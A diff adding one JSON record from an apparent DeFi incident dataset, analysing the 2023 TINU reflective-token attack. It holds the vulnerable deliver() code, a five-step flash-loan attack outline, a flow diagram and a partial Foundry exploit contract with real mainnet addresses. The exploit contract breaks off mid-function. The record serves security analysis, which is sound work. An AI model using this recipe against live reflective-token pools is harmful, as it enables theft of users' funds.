@@ -1,0 +1,34 @@
+{
+ "id": "2023__2023-01-25_TINU_ReflectiveDeliverBalancer",
+ "source_file": "2023/2023-01-25_TINU_ReflectiveDeliverBalancer.md",
+ "title": "TINU (Tom Inu) — Reflective Token deliver() + Balancer Flash Loan Attack Analysis",
+ "date": "2023-01-25",
+ "protocol": "TINU",
+ "chain": "Ethereum",
+ "loss_raw": "22 ETH",
+ "loss_usd": null,
+ "root_cause": "Reflective ERC-20 `deliver()` function allows LP balance manipulation",
+ "attack_tx": "0x6200bf5c...",
+ "vulnerable_contract": "0x2d0e64b6...",
+ "classes": [
+  "defl-tax-token"
+ ],
+ "code_before": [
+  "// ❌ Core vulnerable pattern of reflective tokens\ninterface reflectiveERC20 {\n    function deliver(uint256 amount) external;\n    // When deliver() is called:\n    // _rOwned[sender] -= rAmount\n    // _rTotal -= rAmount  ← changes the global ratio\n    // LP pair's _rOwned remains unchanged, but\n    // currentRate (= _rTotal / _tTotal) decreases\n    // → tokenFromReflection(pairROwned) = pairROwned / currentRate increases\n}\n\n// UniswapV2 pair swap function\n// ❌ Output amount is calculated based on reserves,\n// but if actual balance exceeds reserve, extra tokens are transferred\nfunction swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {\n    require(amount0Out > 0 || amount1Out > 0);\n    (uint112 _reserve0, uint112 _reserve1,) = getReserves();\n    // ❌ balance0 = IERC20(token0).balanceOf(address(this))\n    // After deliver(): balance0 > _reserve0 → additional profit possible\n}",
+  "// File: TomInu.sol\n        function deliver(uint256 tAmount) public {  // ❌\n            address sender = _msgSender();\n            require(!_isExcluded[sender], \"Excluded addresses cannot call this function\");\n            (uint256 rAmount,,,,,) = _getValues(tAmount);\n            _rOwned[sender] = _rOwned[sender].sub(rAmount);\n            _rTotal = _rTotal.sub(rAmount);\n            _tFeeTotal = _tFeeTotal.add(tAmount);\n        }"
+ ],
+ "code_after": [],
+ "steps": [
+  "1 ▶ Balancer Vault flash loan (borrow large amount of WETH)",
+  "2 ▶ Swap WETH → TINU on UniswapV2 TINU-WETH pair",
+  "3 ▶ TINU.deliver(tinu_balance)",
+  "_rTotal decreases → reflected balance of TINU-WETH LP increases",
+  "4 ▶ Extract WETH via UniswapV2 swap",
+  "Actual balance > reserve → receive excess WETH",
+  "5 ▶ Repay Balancer flash loan → net profit 22 ETH"
+ ],
+ "other_code": [
+  "Attacker (0x14d8ada7 — same address as SHOCO attack)\n  │\n  ├─1─▶ Balancer Vault flash loan (borrow large amount of WETH)\n  │\n  ├─2─▶ Swap WETH → TINU on UniswapV2 TINU-WETH pair\n  │       Purchase large amount of TINU\n  │\n  ├─3─▶ TINU.deliver(tinu_balance)\n  │       _rTotal decreases → reflected balance of TINU-WETH LP increases\n  │       LP pair's actual TINU balance > reserve\n  │\n  ├─4─▶ Extract WETH via UniswapV2 swap\n  │       Actual balance > reserve → receive excess WETH\n  │\n  └─5─▶ Repay Balancer flash loan → net profit 22 ETH",
+  "contract TomInuExploit is Test {\n    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    reflectiveERC20 private constant TINU = reflectiveERC20(0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F);\n    IBalancerVault private constant balancerVault =\n        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);\n\n    function testExploit() external {\n        // Borrow large amount of WETH via Balancer flash loan\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WETH);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = flashAmount;\n        balancerVault.flashLoan(address(this), tokens, amounts, \"\");\n    }\n\n    function receiveFlashLoan(\n        IERC20[] memory,\n        uint256[] memory amounts,\n        uint256"
+ ]
+}
